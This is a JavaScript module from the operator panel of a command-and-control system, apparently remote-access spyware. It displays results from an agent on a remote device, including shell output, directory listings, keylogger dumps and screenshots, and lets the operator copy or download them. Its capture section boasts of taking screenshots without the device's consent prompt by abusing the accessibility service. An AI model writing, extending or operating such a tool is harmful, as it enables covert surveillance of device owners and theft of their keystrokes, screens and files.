/* Result viewer — renders the payload of any completed command.
 *
 * The agent has always stored `Command.result` and always pushed it over the
 * socket, but the panel showed only a toast. `shell`, `list_dir`, `keylog_dump`
 * and `screenshot` return data that never reached the operator, so the panel
 * could tell you a command succeeded without showing you what it produced.
 *
 * This module keeps a bounded history for the selected device and renders the
 * most recent result, with copy and download.
 */

(() => {
  const HISTORY_MAX = 40;

  const history = [];   // newest first
  let current = null;   // the command being displayed
  let pollTimer = null;

  const $ = sel => document.querySelector(sel);

  function deviceId() {
    const s = window.__c2State;
    return s && s.current ? s.current.id : null;
  }

  // ═══════════ INGEST ═══════════

  function record(cmd) {
    const dev = deviceId();
    if (dev == null || cmd.device_id !== dev) return;

    // The socket payload is enough to render immediately; the fetch below
    // exists only to pick up `truncated`, which the socket does not carry.
    history.unshift({ ...cmd, truncated: false });
    while (history.length > HISTORY_MAX) history.pop();

    const idx = history.findIndex(c => c.id === cmd.id);
    if (idx > 0) history.splice(idx, 1);

    if (current == null || current.id === cmd.id || cmd.status === "done"
        || cmd.status === "failed") {
      show(cmd.id);
    } else {
      renderList();
    }
    enrich(cmd.id);
  }

  async function enrich(cmdId) {
    const dev = deviceId();
    if (dev == null) return;
    let full;
    try {
      full = await C2.apiJson(`/api/device/${dev}/command/${cmdId}`);
    } catch (_) {
      return;   // socket copy is already on screen
    }
    if (!full || typeof full !== "object") return;

    const hit = history.find(c => c.id === cmdId);
    if (hit) {
      hit.truncated = !!full.truncated;
      hit.result = full.result;
      hit.status = full.status;
    }
    if (current && current.id === cmdId) show(cmdId);
    else renderList();
  }

  // ═══════════ RENDER ═══════════

  function parseResult(cmd) {
    if (cmd.result && typeof cmd.result === "object") return cmd.result;
    const raw = cmd.result == null ? "" : String(cmd.result);
    if (!raw.trim()) return {};
    try { return JSON.parse(raw); }
    catch (_) { return { raw }; }
  }

  function summarise(obj) {
    if (!obj || typeof obj !== "object") return "";
    if (obj.error) return String(obj.error);
    if (obj.stdout) return String(obj.stdout).split("\n")[0].slice(0, 70);
    if (obj.output) return String(obj.output).split("\n")[0].slice(0, 70);
    if (obj.source) return String(obj.source);
    const keys = Object.keys(obj);
    if (!keys.length) return "";
    return `${keys.length} field${keys.length === 1 ? "" : "s"}`;
  }

  function renderList() {
    const box = $("#result-list");
    if (!box) return;
    if (!history.length) {
      box.innerHTML = `<div class="result-empty">no commands yet</div>`;
      return;
    }
    box.innerHTML = history.map(c => {
      const obj = parseResult(c);
      const ok = c.status === "done";
      const cls = current && current.id === c.id ? "sel" : "";
      return `
        <button class="result-item ${ok ? "ok" : "bad"} ${cls}" data-cmd="${c.id}">
          <span class="rid">#${c.id}</span>
          <span class="rtype">${C2.escapeHtml(c.command_type)}</span>
          <span class="rsum">${C2.escapeHtml(summarise(obj))}</span>
          <span class="rstat">${C2.escapeHtml(c.status)}</span>
        </button>`;
    }).join("");
  }

  function bodyText(obj) {
    if (obj == null) return "(no result)";
    if (typeof obj !== "object") return String(obj);
    if (Object.keys(obj).length === 0) return "(empty result)";
    const pretty = JSON.stringify(obj, null, 2);
    // Cap the DOM: a 512 KB payload as one <pre> stalls the tab.
    return pretty.length > 200_000
      ? pretty.slice(0, 200_000) + "\n\n… truncated for display"
      : pretty;
  }

  function show(cmdId) {
    const cmd = history.find(c => c.id === cmdId);
    const dev = deviceId();
    if (!cmd || dev == null) return;

    const wasPolling = pollTimer != null;
    clearTimeout(pollTimer);
    pollTimer = null;

    current = cmd;
    const obj = parseResult(cmd);
    const head = $("#result-head");
    const body = $("#result-body");
    if (head) {
      head.innerHTML = `
        <span class="rh-type">${C2.escapeHtml(cmd.command_type)}</span>
        <span class="rh-id">#${cmd.id}</span>
        <span class="rh-status ${cmd.status === "done" ? "ok" : "bad"}">
          ${C2.escapeHtml(cmd.status)}
        </span>
        ${cmd.truncated ? `<span class="rh-trunc" title="agent caps stored results at 512 KB">clipped</span>` : ""}
        <span class="rh-time">${C2.fmtRelative(cmd.completed_at || cmd.created_at)}</span>`;
    }
    if (body) body.textContent = bodyText(obj);

    renderList();
    syncButtons();

    // A command can complete while the socket is down, so poll once while a
    // result is open. Stop as soon as it lands, so this is not a permanent
    // request loop on every open panel.
    if (!wasPolling && (cmd.status === "pending" || cmd.status === "sent"
                         || cmd.status === "queued")) {
      pollTimer = setTimeout(() => pollOnce(cmdId), 1500);
    }
  }

  async function pollOnce(cmdId) {
    pollTimer = null;
    const dev = deviceId();
    if (dev == null || !current || current.id !== cmdId) return;
    let full;
    try {
      full = await C2.apiJson(`/api/device/${dev}/command/${cmdId}`);
    } catch (_) { return; }
    if (!full || typeof full !== "object") return;

    const hit = history.find(c => c.id === cmdId);
    if (!hit) return;
    Object.assign(hit, full, { command_type: full.type || hit.command_type });
    if (full.status === "done" || full.status === "failed") show(cmdId);
    else {
      current = hit;
      syncButtons();
      pollTimer = setTimeout(() => pollOnce(cmdId), 1500);
    }
  }

  function syncButtons() {
    const copy = $("#result-copy");
    const dl = $("#result-download");
    const pending = current
      && (current.status === "pending" || current.status === "sent"
          || current.status === "queued");
    if (copy) copy.disabled = !current;
    if (dl) dl.disabled = !current;
    const wait = $("#result-waiting");
    if (wait) wait.hidden = !pending;
  }

  // ═══════════ ACTIONS ═══════════

  function copyCurrent() {
    const body = $("#result-body");
    if (!body || !current) return;
    const text = body.textContent;
    if (!text) return;
    navigator.clipboard?.writeText(text)
      .then(() => C2.toast("copied", "success", 1500))
      .catch(() => C2.toast("clipboard unavailable", "error", 2500));
  }

  function downloadCurrent() {
    const body = $("#result-body");
    if (!body || !current) return;
    const blob = new Blob([body.textContent], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `${current.command_type}-${current.id}.json`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  }

  // ═══════════ CAPTURE ═══════════

  async function grabNow() {
    const dev = deviceId();
    if (dev == null) return;
    const btn = $("#mirror-grab");
    if (btn) btn.disabled = true;
    try {
      const r = await C2.apiJson(`/api/device/${dev}/capture`, { method: "POST" });
      if (r && r.error) C2.toast(`capture refused: ${r.error}`, "error", 4000);
      else C2.toast("screenshot requested", "info", 2000);
    } catch (_) {
      C2.toast("capture request failed", "error", 3000);
    } finally {
      if (btn) btn.disabled = false;
    }
  }

  function renderCapturePath(cmd) {
    const chip = $("#mirror-path");
    if (!chip) return;
    const obj = parseResult(cmd);
    const st = obj.source ? obj : (obj.status || obj);

    if (st.source) {
      chip.textContent = st.source;
      chip.className = "path-chip ok";
      chip.title = "captured without a screen-broadcast prompt";
      return;
    }
    if (st.service_bound === false) {
      chip.textContent = "accessibility off";
      chip.className = "path-chip bad";
      chip.title = "enable the accessibility service for consent-free capture";
      return;
    }
    if (st.error) {
      chip.textContent = st.error;
      chip.className = "path-chip bad";
      chip.title = "no capture path available";
      return;
    }
    chip.textContent = "unknown";
    chip.className = "path-chip";
    chip.title = "";
  }

  async function refreshCapturePath() {
    const dev = deviceId();
    if (dev == null) return;
    let r;
    try {
      r = await C2.apiJson(`/api/device/${dev}/capture/status`);
    } catch (_) { return; }
    if (!r || r.error) return;
    renderCapturePath({ result: r.status, command_type: "screenshot_status" });
  }

  function onNewFile(file) {
    const dev = deviceId();
    if (dev == null || file.device_id !== dev) return;
    if (file.category === "screenshot") {
      const img = $("#mirror-img");
      if (img) {
        img.src = `/api/device/${dev}/latest-screenshot?ts=${Date.now()}`;
        img.onerror = () => img.removeAttribute("src");
      }
      refreshCapturePath();
    }
  }

  // ═══════════ LIFECYCLE ═══════════

  function reset() {
    history.length = 0;
    current = null;
    clearTimeout(pollTimer);
    pollTimer = null;
    renderList();
    const head = $("#result-head");
    const body = $("#result-body");
    if (head) head.innerHTML = "";
    if (body) body.textContent = "";
    syncButtons();
    refreshCapturePath();
  }

  function mount() {
    renderList();
    syncButtons();

    const list = $("#result-list");
    if (list) {
      list.addEventListener("click", ev => {
        const btn = ev.target.closest("[data-cmd]");
        if (btn) show(Number(btn.dataset.cmd));
      });
    }
    const copy = $("#result-copy");
    if (copy) copy.addEventListener("click", copyCurrent);
    const dl = $("#result-download");
    if (dl) dl.addEventListener("click", downloadCurrent);
    const grab = $("#mirror-grab");
    if (grab) grab.addEventListener("click", grabNow);
    const path = $("#mirror-path-refresh");
    if (path) path.addEventListener("click", refreshCapturePath);
  }

  window.addEventListener("DOMContentLoaded", mount);

  window.__c2Results = {
    record, show, reset, onNewFile, refreshCapturePath, grabNow,
    history: () => history.slice(),
  };
})();